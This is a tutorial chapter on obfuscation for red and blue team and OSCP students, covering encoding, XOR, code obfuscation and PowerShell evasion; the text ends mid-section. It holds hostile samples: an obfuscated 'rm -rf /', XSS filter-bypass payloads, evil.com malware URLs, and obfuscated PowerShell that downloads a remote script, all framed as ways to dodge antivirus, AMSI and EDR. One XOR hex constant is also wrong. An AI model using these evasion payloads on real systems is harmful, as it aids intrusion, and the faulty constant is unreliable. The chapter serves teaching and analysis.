# 11 - Obfuscation: The Art of Hiding in Plain Sight

---
title: "Obfuscation: From Zero to Hero"
parent: "[[00_Front_Matter/BOOK_OUTLINE]]"
tags:
  - "crypto"
  - "obfuscation"
  - "encoding"
  - "evasion"
  - "malware"
  - "red-team"
created: 2026-02-07
updated: 2026-02-07
difficulty: "Beginner to Advanced"
---

> **Executive Summary**: Obfuscation is the practice of making something difficult to understand or analyze, without actually encrypting it. Unlike encryption (which requires a key to reverse), obfuscation can be reversed by anyone with enough skill and patience. It's used defensively (protecting source code from reverse engineering) and offensively (hiding malware from antivirus, bypassing security filters). This comprehensive guide takes you from absolute zero to advanced techniques, covering string obfuscation, code obfuscation, payload encoding, evasion techniques, and real-world scenarios used in penetration testing and OSCP.

**Why This Matters for Security Professionals**:
- **Red Team**: Bypass antivirus, EDR, and security controls
- **Blue Team**: Understand how attackers hide malicious code
- **OSCP**: Create custom payloads that evade detection
- **CTF**: Solve encoding and obfuscation challenges
- **Real World**: Analyze malware and understand evasion techniques

---

## Table of Contents

1. [What is Obfuscation? (ABSOLUTE BEGINNER)](#1-what-is-obfuscation-absolute-beginner)
2. [Obfuscation vs Encryption vs Encoding](#2-obfuscation-vs-encryption-vs-encoding)
3. [Why Obfuscation Exists](#3-why-obfuscation-exists)
4. [String Obfuscation Techniques](#4-string-obfuscation-techniques)
5. [Encoding Fundamentals](#5-encoding-fundamentals)
6. [XOR Obfuscation (The Foundation)](#6-xor-obfuscation)
7. [Base64 and Beyond](#7-base64-and-beyond)
8. [Code Obfuscation Techniques](#8-code-obfuscation-techniques)
9. [PowerShell Obfuscation](#9-powershell-obfuscation)
10. [JavaScript Obfuscation](#10-javascript-obfuscation)
11. [Python Obfuscation](#11-python-obfuscation)
12. [Bash/Shell Obfuscation](#12-bash-shell-obfuscation)
13. [Binary/Executable Obfuscation](#13-binary-obfuscation)
14. [Payload Encoding for Evasion](#14-payload-encoding-for-evasion)
15. [Anti-Analysis Techniques](#15-anti-analysis-techniques)
16. [Deobfuscation (Reversing Obfuscation)](#16-deobfuscation)
17. [Tools of the Trade](#17-tools-of-the-trade)
18. [Practical Labs](#18-practical-labs)
19. [Real-World Scenarios](#19-real-world-scenarios)
20. [Common Mistakes](#20-common-mistakes)
21. [Interview Questions](#21-interview-questions)
22. [Quick Reference Cheat Sheet](#22-quick-reference)

---

## 1. What is Obfuscation? (ABSOLUTE BEGINNER)

### 1.1 The Simple Explanation

Imagine you want to hide a message from your nosy sibling. You could:
1. **Lock it in a safe** (Encryption) - They need the key to read it
2. **Write it in pig latin** (Obfuscation) - They CAN read it if they figure out the pattern
3. **Write it in a different alphabet** (Encoding) - Just a different representation

**Obfuscation** is like option 2 - it makes something HARD to understand, but not IMPOSSIBLE.

```
Original Message:    "Hello World"
Obfuscated:          "H" + "e" + "l" + "l" + "o" + " " + "W" + "o" + "r" + "l" + "d"
Still says "Hello World", just harder to see at first glance!
```

### 1.2 A Real-World Analogy

Think of obfuscation like:
- **Camouflage**: A soldier wearing camo isn't invisible, but harder to spot
- **Legal documents**: Written in complex language, but technically readable
- **Medicine names**: "Acetylsalicylic acid" instead of "Aspirin"

### 1.3 The Core Principle

```
+------------------------------------------------------------------+
|                    OBFUSCATION PRINCIPLE                          |
+------------------------------------------------------------------+
|                                                                   |
|   ORIGINAL CODE                    OBFUSCATED CODE                |
|   +--------------+                 +--------------------+         |
|   | print("Hi")  |  ============>  | exec(chr(112)+    |         |
|   +--------------+                 | chr(114)+chr(105) |         |
|                                    | +chr(110)+...)    |         |
|                                    +--------------------+         |
|                                                                   |
|   SAME FUNCTIONALITY, DIFFERENT APPEARANCE                        |
|                                                                   |
|   Key Properties:                                                 |
|   - Reversible (no key needed)                                    |
|   - Preserves functionality                                       |
|   - Increases analysis difficulty                                 |
|   - NOT cryptographically secure                                  |
+------------------------------------------------------------------+
```

### 1.4 Who Uses Obfuscation?

| User | Purpose | Example |
|------|---------|---------|
| **Malware Authors** | Hide malicious code from AV | XOR-encoded shellcode |
| **Software Companies** | Protect intellectual property | JavaScript minification |
| **Penetration Testers** | Bypass security controls | Encoded PowerShell payloads |
| **Game Developers** | Anti-cheat protection | Obfuscated game logic |
| **CTF Creators** | Create challenges | Hidden flags in obfuscated code |

---

## 2. Obfuscation vs Encryption vs Encoding

### 2.1 The Critical Differences

This is one of the most commonly confused concepts. Let's clear it up:

```
+------------------------------------------------------------------+
|              ENCODING vs OBFUSCATION vs ENCRYPTION                |
+------------------------------------------------------------------+

ENCODING (Transformation for Compatibility)
+------------------+                    +------------------+
|    "Hello"       |  --- Base64 --->   |   "SGVsbG8="     |
+------------------+                    +------------------+
Purpose: Data format conversion
Security: NONE (anyone can decode)
Reversible: Yes, by anyone
Example: Base64, URL encoding, Hex

OBFUSCATION (Making Hard to Understand)
+------------------+                    +------------------+
|  print("Hi")     |  --- Obfusc -->    | exec(chr(112)    |
|                  |                    | +chr(114)+...)   |
+------------------+                    +------------------+
Purpose: Hide meaning/intent
Security: WEAK (security through obscurity)
Reversible: Yes, with effort
Example: Variable renaming, code splitting

ENCRYPTION (Mathematical Protection)
+------------------+                    +------------------+
|    "Secret"      |  --- AES --->      | 0x8f2a4b...      |
|                  |     + KEY          |                  |
+------------------+                    +------------------+
Purpose: Confidentiality
Security: STRONG (requires key)
Reversible: Only with key
Example: AES, RSA, ChaCha20
```

### 2.2 Comparison Table

| Property | Encoding | Obfuscation | Encryption |
|----------|----------|-------------|------------|
| **Purpose** | Data format | Hide intent | Confidentiality |
| **Key Required** | No | No | Yes |
| **Reversible By** | Anyone | Anyone (with effort) | Key holder only |
| **Security Level** | None | Weak | Strong |
| **Standardized** | Yes (Base64, Hex) | No (creative) | Yes (AES, RSA) |
| **Preserves Functionality** | N/A | Yes | No |
| **Detection Difficulty** | Easy | Medium | Hard |

### 2.3 When to Use What

```python
# ENCODING - When you need data format conversion
import base64
binary_data = b'\x00\x01\x02'
safe_for_json = base64.b64encode(binary_data)  # Now it's text

# OBFUSCATION - When you want to hide intent (but not truly secure)
# Instead of:
password = "admin123"
# Use:
password = ''.join([chr(c) for c in [97,100,109,105,110,49,50,51]])

# ENCRYPTION - When you need real security
from cryptography.fernet import Fernet
key = Fernet.generate_key()
encrypted = Fernet(key).encrypt(b"Top Secret Data")
```

---

## 3. Why Obfuscation Exists

### 3.1 Legitimate Uses

**1. Intellectual Property Protection**
```javascript
// Before obfuscation - Your proprietary algorithm is visible
function calculateSecret(input) {
    // Complex business logic that took years to develop
    return input * 42 + complexFormula(input);
}

// After obfuscation - Harder to steal
var _0x1a2b=['\x63\x61\x6c\x63','\x53\x65\x63\x72\x65\x74'];
function _0x3c4d(_0x5e6f){return _0x5e6f*42+_0x7g8h(_0x5e6f);}
```

**2. Reduce File Size (Minification)**
```javascript
// Original: 1000 bytes
function calculateTotalPrice(itemPrice, taxRate, discountPercent) {
    const subtotal = itemPrice;
    const tax = subtotal * taxRate;
    const discount = subtotal * discountPercent;
    const total = subtotal + tax - discount;
    return total;
}

// Minified: 100 bytes
function c(a,b,d){return a+a*b-a*d}
```

**3. Anti-Tampering**
Make it harder for users to modify software behavior.

### 3.2 Malicious Uses

**1. Evading Antivirus Detection**
```
Antivirus looks for: "powershell.exe -enc <base64>"
Obfuscated version:  "p`o`w`e`r`s`h`e`l`l" + ".exe"
Result: Same functionality, bypasses signature detection
```

**2. Hiding Malware Behavior**
```python
# Obvious malicious code (easily detected)
import os
os.system("rm -rf /")

# Obfuscated (harder to detect statically)
import os
getattr(__import__('os'), 'system')(
    ''.join([chr(114),chr(109),chr(32),chr(45),chr(114),chr(102),chr(32),chr(47)])
)
```

**3. Bypassing Web Application Firewalls (WAF)**
```
# Blocked by WAF:
<script>alert('XSS')</script>

# Obfuscated (might bypass):
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```

### 3.3 The Security Mindset

```
+------------------------------------------------------------------+
|                    THE OBFUSCATION PARADOX                        |
+------------------------------------------------------------------+
|                                                                   |
|   For DEFENDERS:                                                  |
|   - Obfuscation = Red Flag (why are they hiding something?)       |
|   - Legitimate software rarely needs heavy obfuscation            |
|   - Detection opportunity: look for obfuscation patterns          |
|                                                                   |
|   For ATTACKERS:                                                  |
|   - Obfuscation = Survival (evade detection)                      |
|   - Buys time for payload execution                               |
|   - Multiple layers = more evasion                                |
|                                                                   |
|   Reality:                                                        |
|   - Obfuscation is NOT encryption                                 |
|   - Given enough time, anything can be deobfuscated               |
|   - It's a game of making analysis expensive                      |
+------------------------------------------------------------------+
```

---

## 4. String Obfuscation Techniques

Strings are the easiest thing to search for in malware analysis. If your code contains `"malicious_payload"`, any analyst can find it instantly. String obfuscation hides these.

### 4.1 Character Code Conversion

**The Concept**: Instead of storing "Hello", store the ASCII/Unicode values.

```
Character:  H    e    l    l    o
ASCII:      72   101  108  108  111
```

**Python Implementation**:
```python
# ENCODING (Convert string to char codes)
original = "Hello"
encoded = [ord(c) for c in original]
print(encoded)  # [72, 101, 108, 108, 111]

# DECODING (Convert back)
decoded = ''.join([chr(c) for c in encoded])
print(decoded)  # "Hello"

# ONE-LINER OBFUSCATION
# Instead of: password = "secret123"
password = ''.join([chr(c) for c in [115,101,99,114,101,116,49,50,51]])
```

**JavaScript Implementation**:
```javascript
// String.fromCharCode() converts numbers to characters
// Instead of: var msg = "Hello";
var msg = String.fromCharCode(72,101,108,108,111);

// Or using eval with encoded string
eval(String.fromCharCode(97,108,101,114,116,40,39,72,105,39,41));
// This is: alert('Hi')
```

**Bash Implementation**:
```bash
# Using printf with octal codes
# Instead of: echo "Hello"
printf '\110\145\154\154\157'  # Octal for "Hello"

# Using $'\x..' hex escape
echo $'\x48\x65\x6c\x6c\x6f'  # Hex for "Hello"
```

### 4.2 String Splitting/Concatenation

**The Concept**: Break the string into pieces that don't look suspicious individually.

```python
# OBVIOUS (Easily detected):
url = "http://evil.com/malware.exe"

# OBFUSCATED (Pieces look innocent):
a = "http://"
b = "evil"
c = ".com/"
d = "malware"
e = ".exe"
url = a + b + c + d + e
```

**More Advanced Splitting**:
```python
# Using array join
parts = ["http://", "evil", ".com/", "malware", ".exe"]
url = "".join(parts)

# Using format strings
url = "{}{}{}{}{}".format("http://", "evil", ".com/", "malware", ".exe")

# Using reversed strings
url = "exe.erawlam/moc.live//:ptth"[::-1]
```

**JavaScript Example**:
```javascript
// Split and reverse
var domain = "moc.elgoog".split("").reverse().join("");
// Result: "google.com"

// Array join
var cmd = ["a","l","e","r","t"].join("") + "(1)";
eval(cmd);  // Executes alert(1)
```

### 4.3 String Reversal

```python
# Original
command = "whoami"

# Obfuscated (stored reversed)
command = "imaohw"[::-1]

# More complex - reverse in chunks
def chunk_reverse(s, chunk_size=2):
    chunks = [s[i:i+chunk_size] for i in range(0, len(s), chunk_size)]
    return ''.join(chunks[::-1])

# "whoami" -> "mi" + "oa" + "wh" -> "mioawh" (reversed chunks)
# To decode: reverse the chunks back
```

### 4.4 XOR String Encoding

XOR is the foundation of most obfuscation. We'll cover it extensively in Section 6.

```python
def xor_string(text, key):
    """XOR each character with key"""
    return ''.join([chr(ord(c) ^ key) for c in text])

# Encode
plaintext = "secret"
key = 42
encoded = xor_string(plaintext, key)
print(f"Encoded: {encoded}")  # Garbled text

# Decode (XOR again with same key)
decoded = xor_string(encoded, key)
print(f"Decoded: {decoded}")  # "secret"
```

### 4.5 String Encryption (Pseudo-Obfuscation)

For stronger hiding, encrypt strings and decrypt at runtime:

```python
import base64

# "Encrypt" with Base64 (not real encryption, but hides from basic analysis)
secret = base64.b64encode(b"password123").decode()
# secret = "cGFzc3dvcmQxMjM="

# At runtime, decode
actual = base64.b64decode(secret).decode()
```

### 4.6 Visual Diagram: String Obfuscation Layers

```
+------------------------------------------------------------------+
|                    STRING OBFUSCATION LAYERS                      |
+------------------------------------------------------------------+

Original String: "http://evil.com/shell.exe"

Layer 1: Character Codes
[104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,115,104,101,108,108,46,101,120,101]

Layer 2: XOR with key 0x42
[0x6a,0x76,0x76,0x70,0x78,0x6d,0x6d,0x67,0x74,0x6f,0x6a,0x6c,0x61,0x6f,0x6d,...]

Layer 3: Base64 Encode
"anZ2cHhtbWd0b2psYW9t..."

Layer 4: Split into array
["anZ", "2cH", "htt", "bWd", ...]

Layer 5: Store reversed
["dgW", "tth", "Hc2", "Zna", ...]

To decode: Reverse each step!
```

---

## 5. Encoding Fundamentals

Before diving deeper into obfuscation, you must understand encoding. Encoding is the foundation of most obfuscation techniques.

### 5.1 What is Encoding?

Encoding converts data from one format to another. It's **NOT** for security - it's for compatibility.

```
Binary Data: 0x48 0x65 0x6c 0x6c 0x6f
             (Raw bytes, might cause issues in text systems)

Base64:      "SGVsbG8="
             (Safe ASCII characters, works everywhere)
```

### 5.2 Common Encoding Schemes

#### ASCII (American Standard Code for Information Interchange)

Maps characters to numbers 0-127.

```
Character | Decimal | Hex  | Binary
----------|---------|------|----------
    A     |   65    | 0x41 | 01000001
    a     |   97    | 0x61 | 01100001
    0     |   48    | 0x30 | 00110000
   (space)|   32    | 0x20 | 00100000
```

**Python ASCII Operations**:
```python
# Character to ASCII
print(ord('A'))  # 65

# ASCII to Character
print(chr(65))   # 'A'

# String to ASCII list
text = "Hello"
ascii_list = [ord(c) for c in text]
print(ascii_list)  # [72, 101, 108, 108, 111]
```

#### Hexadecimal (Base16)

Uses 0-9 and A-F. Each hex digit = 4 bits. Two hex digits = 1 byte.

```
Decimal: 255
Binary:  11111111
Hex:     FF

Text "Hi" in Hex:
H = 0x48
i = 0x69
"Hi" = 0x4869 or "4869" or "48 69"
```

**Python Hex Operations**:
```python
# String to Hex
text = "Hello"
hex_string = text.encode().hex()
print(hex_string)  # "48656c6c6f"

# Hex to String
hex_string = "48656c6c6f"
text = bytes.fromhex(hex_string).decode()
print(text)  # "Hello"

# Integer to Hex
print(hex(255))  # "0xff"

# Hex to Integer
print(int("ff", 16))  # 255
```

#### Base64

Encodes binary data using 64 ASCII characters (A-Z, a-z, 0-9, +, /).

**Why Base64?**
- Email and HTTP are text-based
- Binary data might contain special characters
- Base64 converts anything to safe ASCII

```
Original: "Man"
Binary:   01001101 01100001 01101110 (3 bytes = 24 bits)
Group:    010011 010110 000101 101110 (4 groups of 6 bits)
Decimal:  19     22     5      46
Base64:   T      W      F      u
Result:   "TWFu"
```

**The Base64 Alphabet**:
```
Index: 0-25  = A-Z
Index: 26-51 = a-z
Index: 52-61 = 0-9
Index: 62    = +
Index: 63    = /
Padding: =
```

**Python Base64 Operations**:
```python
import base64

# Encode
text = "Hello, World!"
encoded = base64.b64encode(text.encode()).decode()
print(encoded)  # "SGVsbG8sIFdvcmxkIQ=="

# Decode
decoded = base64.b64decode(encoded).decode()
print(decoded)  # "Hello, World!"

# Recognize Base64:
# - Characters: A-Za-z0-9+/
# - Often ends with = or ==
# - Length is multiple of 4
```

#### URL Encoding (Percent Encoding)

Used in URLs. Special characters become %XX (XX = hex value).

```
Character | Encoded
----------|--------
  (space) | %20
    /     | %2F
    ?     | %3F
    =     | %3D
    &     | %26
```

**Python URL Encoding**:
```python
from urllib.parse import quote, unquote

# Encode
text = "Hello World?"
encoded = quote(text)
print(encoded)  # "Hello%20World%3F"

# Decode
decoded = unquote(encoded)
print(decoded)  # "Hello World?"
```

#### Unicode Encoding

Multiple formats for representing Unicode characters.

```
Character: e (é with accent)

UTF-8:    0xC3 0xA9 (2 bytes)
UTF-16:   0x00E9 (2 bytes)
UTF-32:   0x000000E9 (4 bytes)
HTML:     &eacute; or &#233; or &#xe9;
```

### 5.3 Encoding Detection

How to identify what encoding you're looking at:

```
+------------------------------------------------------------------+
|                    ENCODING RECOGNITION GUIDE                     |
+------------------------------------------------------------------+

Base64:
- Characters: A-Za-z0-9+/
- Padding: = or == at end
- Example: "SGVsbG8gV29ybGQ="

Hex:
- Characters: 0-9A-Fa-f only
- Usually even length
- Example: "48656c6c6f"

URL Encoded:
- Contains %XX patterns
- Example: "Hello%20World"

Unicode Escaped:
- Patterns: \uXXXX or \xXX
- Example: "\u0048\u0065\u006c\u006c\u006f"

Binary:
- Only 0 and 1
- Often in groups of 8
- Example: "01001000 01100101"

Octal:
- Characters: 0-7 only
- Often with \ prefix
- Example: "\110\145\154\154\157"
```

### 5.4 Multi-Layer Encoding

Attackers often stack encodings:

```python
import base64
from urllib.parse import quote

original = "alert(1)"

# Layer 1: Base64
layer1 = base64.b64encode(original.encode()).decode()
print(f"Layer 1 (Base64): {layer1}")
# "YWxlcnQoMSk="

# Layer 2: URL Encode
layer2 = quote(layer1)
print(f"Layer 2 (URL): {layer2}")
# "YWxlcnQoMSk%3D"

# Layer 3: Base64 again
layer3 = base64.b64encode(layer2.encode()).decode()
print(f"Layer 3 (Base64): {layer3}")
# "WVd4bGNuUW9NU2slM0Q="

# To decode: reverse each layer
```

---

## 6. XOR Obfuscation (The Foundation)

XOR (Exclusive OR) is THE fundamental operation in obfuscation and cryptography. If you understand XOR deeply, you understand 80% of obfuscation.

### 6.1 XOR Basics (For Complete Beginners)

**What is XOR?**
XOR compares two bits and returns 1 if they're different, 0 if they're the same.

```
XOR Truth Table:
A | B | A XOR B
--|---|--------
0 | 0 |    0    (same = 0)
0 | 1 |    1    (different = 1)
1 | 0 |    1    (different = 1)
1 | 1 |    0    (same = 0)

Memory trick: "Different = 1, Same = 0"
```

**The Magic Property**:
```
A XOR B = C
C XOR B = A    (XOR again with same key = original!)

This is why XOR is perfect for encryption/obfuscation:
- Encrypt: plaintext XOR key = ciphertext
- Decrypt: ciphertext XOR key = plaintext
```

### 6.2 XOR Examples

**Single Byte XOR**:
```
Plaintext: 'A' = 01000001 (65 in decimal)
Key:       0x42 = 01000010 (66 in decimal)

XOR Operation (bit by bit):
  01000001  (A)
^ 01000010  (Key 0x42)
----------
  00000011  (Result: 0x03 or ETX character)

Decrypt:
  00000011  (Ciphertext)
^ 01000010  (Key 0x42)
----------
  01000001  (Back to 'A')
```

**Python XOR Implementation**:
```python
def xor_bytes(data, key):
    """XOR each byte with key byte"""
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, int):
        return bytes([b ^ key for b in data])
    else:
        # Repeating key
        return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

# Single byte key
plaintext = b"Hello World"
key = 0x42
ciphertext = xor_bytes(plaintext, key)
print(f"Encrypted: {ciphertext.hex()}")

# Decrypt (same operation)
decrypted = xor_bytes(ciphertext, key)
print(f"Decrypted: {decrypted.decode()}")
```

### 6.3 Multi-Byte XOR Key

Single byte XOR is easy to break. Using a multi-byte key is stronger:

```python
def xor_with_key(data, key):
    """XOR with repeating multi-byte key"""
    result = []
    for i, byte in enumerate(data):
        key_byte = key[i % len(key)]  # Repeat key
        result.append(byte ^ key_byte)
    return bytes(result)

plaintext = b"This is a secret message"
key = b"KEY"  # 3-byte key

# Key repeats: K-E-Y-K-E-Y-K-E-Y...
encrypted = xor_with_key(plaintext, key)
print(f"Encrypted (hex): {encrypted.hex()}")

decrypted = xor_with_key(encrypted, key)
print(f"Decrypted: {decrypted.decode()}")
```

### 6.4 Visual XOR Process

```
+------------------------------------------------------------------+
|                    XOR ENCRYPTION PROCESS                         |
+------------------------------------------------------------------+

Plaintext:  "HELLO" = 48 45 4C 4C 4F (hex)
Key:        "AB"    = 41 42 (hex, repeating)

Step by step:
Position:    0    1    2    3    4
Plaintext:   48   45   4C   4C   4F
Key (repeat):41   42   41   42   41
             --   --   --   --   --
XOR Result:  09   07   0D   0E   0E

Ciphertext: 09 07 0D 0E 0E

To Decrypt: XOR ciphertext with same key!
Position:    0    1    2    3    4
Ciphertext:  09   07   0D   0E   0E
Key (repeat):41   42   41   42   41
             --   --   --   --   --
XOR Result:  48   45   4C   4C   4F = "HELLO"
```

### 6.5 XOR in Malware

Malware authors use XOR to hide:
- Command & Control URLs
- Shell commands
- Encryption keys
- Signatures that AV looks for

**Example: Hiding a URL**:
```python
# Attacker's code
def hide_url():
    url = b"http://evil.com/malware"
    key = 0xAA
    hidden = bytes([b ^ key for b in url])
    return hidden.hex()

# Result stored in malware
HIDDEN_URL = "c2c3c3c8eeafc5c0c9c6edc1c9c7afc7c5c6c5d9c5d8c1"

# At runtime, decode
def get_url():
    hidden = bytes.fromhex(HIDDEN_URL)
    key = 0xAA
    return bytes([b ^ key for b in hidden]).decode()

print(get_url())  # "http://evil.com/malware"
```

### 6.6 Breaking Single-Byte XOR

Single-byte XOR is trivially breakable:

```python
def break_single_xor(ciphertext):
    """Try all 256 possible single-byte keys"""
    results = []
    for key in range(256):
        decrypted = bytes([b ^ key for b in ciphertext])
        try:
            text = decrypted.decode('ascii')
            # Score based on printable characters
            score = sum(1 for c in text if c.isprintable())
            results.append((key, text, score))
        except:
            pass
    
    # Return best result (highest score)
    results.sort(key=lambda x: x[2], reverse=True)
    return results[0] if results else None

# Test
ciphertext = bytes([b ^ 0x42 for b in b"Secret Message"])
key, plaintext, score = break_single_xor(ciphertext)
print(f"Key: {hex(key)}, Plaintext: {plaintext}")
```

---

## 7. Base64 and Beyond

### 7.1 Deep Dive into Base64

Base64 is everywhere in obfuscation because:
- Converts any binary to printable ASCII
- Easy to implement
- Works in any context (JSON, XML, HTML, URLs)

**The Complete Base64 Alphabet**:
```
Value Char | Value Char | Value Char | Value Char
------|------|------|------|------|------|------|------
  0   A    | 16   Q    | 32   g    | 48   w
  1   B    | 17   R    | 33   h    | 49   x
  2   C    | 18   S    | 34   i    | 50   y
  3   D    | 19   T    | 35   j    | 51   z
  4   E    | 20   U    | 36   k    | 52   0
  5   F    | 21   V    | 37   l    | 53   1
  6   G    | 22   W    | 38   m    | 54   2
  7   H    | 23   X    | 39   n    | 55   3
  8   I    | 24   Y    | 40   o    | 56   4
  9   J    | 25   Z    | 41   p    | 57   5
 10   K    | 26   a    | 42   q    | 58   6
 11   L    | 27   b    | 43   r    | 59   7
 12   M    | 28   c    | 44   s    | 60   8
 13   N    | 29   d    | 45   t    | 61   9
 14   O    | 30   e    | 46   u    | 62   +
 15   P    | 31   f    | 47   v    | 63   /

Padding: =
```

**Manual Base64 Encoding** (Understanding the algorithm):
```python
def manual_base64_encode(data):
    """Encode bytes to Base64 manually"""
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    
    # Convert to binary string
    binary = ''.join(format(byte, '08b') for byte in data)
    
    # Pad to multiple of 6
    while len(binary) % 6 != 0:
        binary += '0'
    
    # Split into 6-bit chunks
    chunks = [binary[i:i+6] for i in range(0, len(binary), 6)]
    
    # Convert to Base64 characters
    result = ''.join(alphabet[int(chunk, 2)] for chunk in chunks)
    
    # Add padding
    while len(result) % 4 != 0:
        result += '='
    
    return result

# Test
print(manual_base64_encode(b"Man"))  # "TWFu"
print(manual_base64_encode(b"Ma"))   # "TWE="
print(manual_base64_encode(b"M"))    # "TQ=="
```

### 7.2 Base64 Variants

**Standard Base64 (RFC 4648)**:
- Alphabet: A-Za-z0-9+/
- Padding: =

**URL-Safe Base64**:
- Alphabet: A-Za-z0-9-_ (replaces + and /)
- Used in: JWTs, URLs

**Base32**:
- Alphabet: A-Z2-7
- Longer output but case-insensitive
- Used in: TOTP codes, onion addresses

**Base16 (Hex)**:
- Alphabet: 0-9A-F
- 2x size increase

```python
import base64

text = b"Hello+World/Test"

# Standard Base64
print(base64.b64encode(text))
# b'SGVsbG8rV29ybGQvVGVzdA=='

# URL-Safe Base64
print(base64.urlsafe_b64encode(text))
# b'SGVsbG8rV29ybGQvVGVzdA=='  (+ and / would be replaced if in output)

# Base32
print(base64.b32encode(text))
# b'JBSWY3DPFNPXG43JONXWIZI='

# Base16 (Hex)
print(base64.b16encode(text))
# b'48656C6C6F2B576F726C642F54657374'
```

### 7.3 Detecting and Decoding

```python
import base64
import re

def detect_and_decode(text):
    """Attempt to detect encoding and decode"""
    
    # Check Base64 (standard)
    if re.match(r'^[A-Za-z0-9+/]+=*$', text):
        try:
            decoded = base64.b64decode(text)
            if decoded.decode('utf-8', errors='ignore').isprintable():
                return f"Base64: {decoded.decode()}"
        except:
            pass
    
    # Check Hex
    if re.match(r'^[0-9A-Fa-f]+$', text) and len(text) % 2 == 0:
        try:
            decoded = bytes.fromhex(text).decode()
            return f"Hex: {decoded}"
        except:
            pass
    
    # Check URL encoding
    if '%' in text:
        from urllib.parse import unquote
        decoded = unquote(text)
        if decoded != text:
            return f"URL: {decoded}"
    
    return "Unknown encoding"

# Test
print(detect_and_decode("SGVsbG8gV29ybGQ="))  # Base64
print(detect_and_decode("48656c6c6f"))         # Hex
print(detect_and_decode("Hello%20World"))       # URL
```

---

## 8. Code Obfuscation Techniques

Beyond string obfuscation, entire code blocks can be obfuscated.

### 8.1 Variable Renaming

Replace meaningful names with meaningless ones:

```python
# BEFORE: Clear intent
def calculate_discount(original_price, discount_percent):
    discount_amount = original_price * (discount_percent / 100)
    final_price = original_price - discount_amount
    return final_price

# AFTER: Obfuscated names
def _0x1a2b(_0x3c4d, _0x5e6f):
    _0x7890 = _0x3c4d * (_0x5e6f / 100)
    _0xabcd = _0x3c4d - _0x7890
    return _0xabcd
```

### 8.2 Dead Code Insertion

Add code that does nothing but confuses analysis:

```python
# BEFORE
def login(user, password):
    return check_credentials(user, password)

# AFTER: With dead code
def login(user, password):
    _unused = "random string that does nothing"
    if False:  # Never executes
        print("This never runs")
        x = 1 + 2 + 3
    result = check_credentials(user, password)
    _also_unused = len(_unused) * 42  # Computed but never used
    return result
```

### 8.3 Control Flow Obfuscation

Make the logic path confusing:

```python
# BEFORE: Simple if-else
def is_admin(user):
    if user.role == "admin":
        return True
    return False

# AFTER: Obfuscated control flow
def is_admin(user):
    result = None
    state = 0
    while True:
        if state == 0:
            if user.role == "admin":
                state = 1
            else:
                state = 2
        elif state == 1:
            result = True
            state = 3
        elif state == 2:
            result = False
            state = 3
        elif state == 3:
            break
    return result
```

### 8.4 Opaque Predicates

Conditions that always evaluate the same way, but are hard to analyze:

```python
import math

# These are ALWAYS True, but hard for static analysis to determine
def always_true():
    x = 12345
    return (x * x) % 3 != 2  # Mathematical property: n^2 % 3 is never 2

def also_always_true():
    return math.sin(0) == 0 and math.cos(0) == 1

# Use in obfuscation
def hidden_function():
    if always_true():
        # Real code here
        do_malicious_thing()
    else:
        # Dead code, never executes
        do_harmless_thing()
```

### 8.5 Code Flattening

Convert structured code to a flat state machine:

```python
# BEFORE: Clear structure
def process(data):
    result = []
    for item in data:
        if item > 0:
            result.append(item * 2)
        else:
            result.append(0)
    return result

# AFTER: Flattened
def process(data):
    state = 'INIT'
    idx = 0
    result = []
    
    while True:
        if state == 'INIT':
            idx = 0
            state = 'CHECK'
        elif state == 'CHECK':
            if idx >= len(data):
                state = 'END'
            else:
                state = 'PROCESS'
        elif state == 'PROCESS':
            item = data[idx]
            if item > 0:
                state = 'POSITIVE'
            else:
                state = 'ZERO'
        elif state == 'POSITIVE':
            result.append(data[idx] * 2)
            idx += 1
            state = 'CHECK'
        elif state == 'ZERO':
            result.append(0)
            idx += 1
            state = 'CHECK'
        elif state == 'END':
            break
    
    return result
```

---

## 9. PowerShell Obfuscation

PowerShell is a prime target for obfuscation because:
- Powerful for system access
- Commonly monitored by security tools
- Needs obfuscation to bypass AMSI, EDR, and logging

### 9.1 Basic PowerShell Obfuscation Techniques

**Case Insensitivity Abuse**:
```powershell
# These are all equivalent:
Invoke-Expression
INVOKE-EXPRESSION  
iNvOkE-ExPrEsSiOn
```

**Tick Mark Insertion (Escape Characters)**:
```powershell
# PowerShell ignores ` in most positions
# Original:
Invoke-Expression

# Obfuscated:
I`nv`o`ke-Ex`pr`ess`ion
```

**String Concatenation**:
```powershell
# Original:
"Invoke-Expression"

# Obfuscated:
"Inv" + "oke-" + "Expr" + "ession"
$a = "Invoke"; $b = "Expression"; "$a-$b"
```

**Variable Substitution**:
```powershell
# Original:
Invoke-Expression "whoami"

# Obfuscated:
$cmd = "whoami"
$inv = "Invoke-Expression"
& ($inv) $cmd
```

### 9.2 Encoding Techniques

**Base64 Encoding**:
```powershell
# Encode command
$command = "Write-Host 'Hello World'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
# Result: VwByAGkAdABlAC0ASABvAHMAdAAgACcASABlAGwAbABvACAAVwBvAHIAbABkACcA

# Execute encoded command
powershell -EncodedCommand $encoded

# Or use IEX with decoded
IEX([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))
```

**Compression + Base64**:
```powershell
# Compress and encode
$code = "Write-Host 'This is a long command that gets compressed'"
$bytes = [System.Text.Encoding]::UTF8.GetBytes($code)
$stream = New-Object IO.MemoryStream
$deflate = New-Object IO.Compression.DeflateStream($stream, [IO.Compression.CompressionMode]::Compress)
$deflate.Write($bytes, 0, $bytes.Length)
$deflate.Close()
$compressed = [Convert]::ToBase64String($stream.ToArray())

# Execute (decompress and run)
$decoded = [Convert]::FromBase64String($compressed)
$stream = New-Object IO.MemoryStream(,$decoded)
$inflate = New-Object IO.Compression.DeflateStream($stream, [IO.Compression.CompressionMode]::Decompress)
$reader = New-Object IO.StreamReader($inflate)
IEX $reader.ReadToEnd()
```

### 9.3 Advanced PowerShell Obfuscation

**Using GetType and InvokeMember**:
```powershell
# Original:
[System.Net.WebClient]::new().DownloadString("http://evil.com/script.ps1")

# Obfuscated:
$t = [Type]("System.Net.WebClient")
$m = $t.GetMethod("DownloadString", [Type[]]@([String]))
$obj = $t.GetConstructor([Type[]]@()).Invoke(@())
$m.Invoke($obj, @("http://evil.com/script.ps1"))
```

**Character Array**:
```powershell
# Original:
Invoke-Expression

# As character codes:
$chars = @(73,110,118,111,107,101,45,69,120,112,114,101,115,115,105,111,110)
